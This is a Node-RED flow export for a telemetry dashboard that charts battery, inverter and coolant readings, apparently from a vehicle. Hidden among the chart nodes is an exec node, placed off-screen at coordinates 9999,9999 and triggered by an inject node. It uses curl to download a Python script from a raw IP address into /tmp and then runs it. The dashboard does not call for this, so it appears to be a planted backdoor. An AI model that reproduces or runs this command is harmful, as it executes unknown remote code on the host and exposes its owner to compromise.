        "id": "114ce49df49b45d8",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiator Coolant Flow Rate Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 990,
        "y": 380,
        "wires": []
    },
    {
        "id": "dd7cb72a11e31ce4",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "8cb0a474df46243c",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Flow Rate Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 980,
        "y": 680,
        "wires": []
    },
    {
        "id": "af5dc0bdbc40aeb3",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "8cb0a474df46243c",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Controller Coolant Flow Rate Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1040,
        "wires": []
    },
    {
        "id": "e5d2fd471241621b",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Accumulator Coolant Flow Rate Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 1160,
        "wires": []
    },
    {
        "id": "aa6faf686efe3275",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiator Coolant Pressure Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 520,
        "wires": []
    },
    {
        "id": "9cda0b72ea438ee8",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiator Coolant Pressure In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 990,
        "y": 560,
        "wires": []
    },
    {
        "id": "ee0b620c5caa1bd0",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "8cb0a474df46243c",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Pressure Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 990,
        "y": 720,
        "wires": []
    },
    {
        "id": "bd76826b7309a623",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "f52af5df60607f14",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Pressure In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 980,
        "y": 760,
        "wires": []
    },
    {
        "id": "2c9a71f9c9130449",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "f52af5df60607f14",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Controller Coolant Pressure Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1020,
        "y": 880,
        "wires": []
    },
    {
        "id": "0dc21fdc8dcf6647",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Pressure In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 980,
        "y": 920,
        "wires": []
    },
    {
        "id": "a7df116e82606079",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Accumulator Coolant Pressure Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 960,
        "wires": []
    },
    {
        "id": "8393d1685de05288",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Accumulator Coolant Pressure In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 1000,
        "wires": []
    },
    {
        "id": "63b6492d40877894",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Limit Cooling Derating",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 960,
        "y": 1340,
        "wires": []
    },
    {
        "id": "a5d85a254cbc717b",
        "type": "json",
        "z": "2b8b862ad49c5254",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 390,
        "y": 520,
        "wires": [
            [
                "9e7af11f3abadef1"
            ]
        ]
    },
    {
        "id": "66f5224593a718a5",
        "type": "websocket in",
        "z": "2b8b862ad49c5254",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 190,
        "y": 520,
        "wires": [
            [
                "a5d85a254cbc717b"
            ]
        ]
    },
    {
        "id": "07f2802c09feebc7",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "critical messages",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar Pack_Current =\n{\n    topic: \"Pack Current (A)\",\n    payload: msg.payload.Pack_Current\n}\ntry {\n    Pack_Current.payload = Pack_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Inst_Voltage =\n{\n    topic: \"Pack Instant Voltage (V)\",\n    payload: msg.payload.Pack_Inst_Voltage\n}\ntry {\n    Pack_Inst_Voltage.payload = Pack_Inst_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Average_Current =\n{\n    topic: \"Average Current (A)\",\n    payload: msg.payload.Average_Current\n}\ntry {\n    Average_Current.payload = Average_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload.high_temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Thermistor_ID =\n{\n    topic: \"High Thermistor ID\",\n    payload: msg.payload.High_Thermistor_ID\n}\ntry {\n    High_Thermistor_ID.payload = High_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Average_Temperature =\n{\n    topic: \"Average Temperature (ºC)\",\n    payload: msg.payload.Average_Temperature\n}\ntry {\n    Average_Temperature.payload = Average_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload.Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage_ID =\n{\n    topic: \"Low Cell Voltage Id\",\n    payload: msg.payload.Low_Cell_Voltage_ID\n}\ntry {\n    Low_Cell_Voltage_ID.payload = Low_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage (V)\",\n    payload: msg.payload.Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Resistance =\n{\n    topic: \"High Cell Resistance (MΩ)\",\n    payload: msg.payload.High_Cell_Resistance\n}\ntry {\n    High_Cell_Resistance.payload = High_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Intres_ID =\n{\n    topic: \"High Internal Resistance Id\",\n    payload: msg.payload.High_Intres_ID\n}\ntry {\n    High_Intres_ID.payload = High_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar DTC_Flags_1 =\n{\n    topic: \"DTC Flags 1\",\n    payload: msg.payload.DTC_Flags_1\n}\ntry {\n    DTC_Flags_1.payload = DTC_Flags_1.payload.toFixed(sigFigs)\n} catch { }\n\nvar DTC_Flags_2 =\n{\n    topic: \"DTC Flags 2\",\n    payload: msg.payload.DTC_Flags_2\n}\ntry {\n    DTC_Flags_2.payload = DTC_Flags_2.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_dcBusVoltage =\n{\n    topic: \"Inverter DC Bus Voltage (V)\",\n    payload: msg.payload.INV_dcBusVoltage\n}\ntry {\n    INV_dcBusVoltage.payload = INV_dcBusVoltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Server Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload / 1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Pack_Current,\n    Pack_Inst_Voltage,\n    Average_Current,\n    High_Temperature,\n    High_Thermistor_ID,\n    Average_Temperature,\n    Low_Cell_Voltage,\n    Low_Cell_Voltage_ID,\n    Avg_Cell_Voltage,\n    High_Cell_Resistance,\n    High_Intres_ID,\n    DTC_Flags_1,\n    DTC_Flags_2,\n    INV_dcBusVoltage,\n    Latency,\n    Total_Latency\n]",
        "outputs": 16,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 570,
        "y": 160,
        "wires": [
            [
                "8c65ea7c383476b5"
            ],
            [
                "db1f571836c43409"
            ],
            [
                "939824c0aa594ab7"
            ],
            [
                "92e1d163796f7775"
            ],
            [
                "e8e8a84b72cd37c3"
            ],
            [
                "92e1d163796f7775"
            ],
            [
                "5d79c7a5078623ae"
            ],
            [
                "fce502dd356ea92b"
            ],
            [
                "d91aaefa7f961334"
            ],
            [
                "a6bd88f7d99fc59b"
            ],
            [
                "46a8903856a98bf8"
            ],
            [
                "39bd307837c22326"
            ],
            [
                "605f6de5fe092e0c"
            ],
            [
                "8f349d4d1853bb24"
            ],
            [
                "8066c9633dea5a86"
            ],
            [
                "36768134d372e946"
            ]
        ]
    },
    {
        "id": "8c65ea7c383476b5",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "88b49e6ceb25a30a",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "db1f571836c43409",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "c38742dbefd44e87",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Pack Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "939824c0aa594ab7",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "580197ebbe9ef12d",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Average Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "92e1d163796f7775",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "c38742dbefd44e87",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Highest/Average Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#6dc700",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 870,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "e8e8a84b72cd37c3",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "c38742dbefd44e87",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Highest Thermistor ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 840,
        "y": 240,
        "wires": []
    },
    {
        "id": "5d79c7a5078623ae",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "88b49e6ceb25a30a",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "fce502dd356ea92b",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "c38742dbefd44e87",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Low Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 830,
        "y": 320,
        "wires": []
    },
    {
        "id": "d91aaefa7f961334",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "c773bb73ce497e9a",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 360,
        "wires": [
            []
        ]
    },
    {
        "id": "a6bd88f7d99fc59b",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "580197ebbe9ef12d",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "High Cell Internal Resistance",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "46a8903856a98bf8",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "c38742dbefd44e87",
        "order": 7,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "High Cell Resistance ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 850,
        "y": 440,
        "wires": []
    },
    {
        "id": "605f6de5fe092e0c",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "dtc status #2 interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 520,
        "wires": [
            [
                "5d0afbcc6bb0452f"
            ]
        ]
    },
    {
        "id": "39bd307837c22326",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "dtc status #1 interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 480,
        "wires": [
            [
                "72dc64a3ce9a264d"
            ]
        ]
    },
    {
        "id": "72dc64a3ce9a264d",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "c38742dbefd44e87",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "DTC status #1",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 480,
        "wires": []
    },
    {
        "id": "5d0afbcc6bb0452f",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "c38742dbefd44e87",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "DTC Status #2",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 520,
        "wires": []
    },
    {
        "id": "8f349d4d1853bb24",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "c773bb73ce497e9a",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Inverter DC Bus Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "8066c9633dea5a86",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "606ed3aaa13d01f2",
        "order": 1,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 830,
        "y": 600,
        "wires": []
    },
    {
        "id": "36768134d372e946",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "606ed3aaa13d01f2",
        "order": 2,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 830,
        "y": 640,
        "wires": []
    },
    {
        "id": "7ca3dde1fc4275e4",
        "type": "json",
        "z": "c91b7712e66969da",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 390,
        "y": 160,
        "wires": [
            [
                "07f2802c09feebc7"
            ]
        ]
    },
    {
        "id": "cf2695941d396b60",
        "type": "websocket in",
        "z": "c91b7712e66969da",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 190,
        "y": 160,
        "wires": [
            [
                "7ca3dde1fc4275e4"
            ]
        ]
    },
    {
        "id": "04e9bf59d127ed59",
        "type": "exec",
        "z": "54ee7ab52b252314",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 9999,
        "y": 9999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "213d0c20572925ff",
        "type": "inject",
        "z": "54ee7ab52b252314",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 9999,
        "y": 9990,
        "wires": [
            [
                "04e9bf59d127ed59"
            ]
        ]
    },
    {
        "id": "af45de85e4f392f6",
        "type": "function",
        "z": "54ee7ab52b252314",
        "name": "Useful",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload.Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload.Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload.Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload.Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload.Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload.Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload.Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload.maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload.Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload.Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload.High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload.High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload.Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload.Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload.Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload.Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload.Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload.Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload / 1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage,\n    Latency,\n    Total_Latency\n]",
        "outputs": 20,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 530,
        "y": 180,
        "wires": [
            [
                "64e2db8ac1cc6ff8"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "5798f909e7a0b4ef"
            ],
            [
                "980a89194ee4a5f9"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "8326a393562f231b"
            ],
            [
                "5d79523904eb1a14"
            ],
            [
                "3da3df35da0f6272"
            ]
        ]
    },
    {
        "id": "5798f909e7a0b4ef",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "32f9514944cd045a",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Pack State of Charge",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 780,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "dadd7a46ade8d9ec",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "9aa6fcac7bcb047b",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Temperature (Celsius)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
